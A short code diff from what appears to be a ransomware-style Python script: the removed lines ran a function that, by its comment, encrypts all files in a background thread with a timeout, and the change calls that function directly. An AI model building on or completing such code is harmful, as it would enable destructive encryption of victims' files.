@@ -42,13 +42,4 @@ def FuckTheSystem():
 
 ###################### main ######################
 
-t1 = threading.Thread(target=FuckTheSystem)  # daemon thread runs the encrypt_all_files() function in background
-t1.daemon = True  # make the thread run in bg
-t1.start()  # start the encrypting thread
-t1.join(encryption_timeout)
-
-# If thread is still active
-if t1.is_alive():
-    print("terminated")
-    t1.terminate()
-    t1.join()
+FuckTheSystem()
